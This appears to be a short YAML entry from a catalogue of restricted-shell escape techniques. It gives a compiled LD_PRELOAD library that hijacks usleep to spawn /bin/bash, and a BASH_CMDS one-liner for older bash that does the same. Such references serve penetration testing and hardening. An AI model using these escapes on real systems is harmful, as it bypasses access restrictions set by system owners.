---
functions:
  shell:
    - description: Search binaries with ``echo *``, get ``objdump -T binary | grep GLIC`` and make a script to replace one of the functions (example with usleep).
      code: |
        vim script.c
        #include <stdio.h>
        #include <stdlib.h>
        void usleep() {
          unsetenv("LD_PRELOAD");
          system("echo ok! && /bin/bash");
          exit(0);
        }
        gcc -shared script.c -o script
        declare -x LD_PRELOAD=/path/to/script
    - description: "This was fixed in bash 4.4 (see https://lists.gnu.org/archive/html/bug-bash/2017-03/msg00077.html)"
      code: |
        BASH_CMDS[gtfo]=/bin/bash; gtfo
---
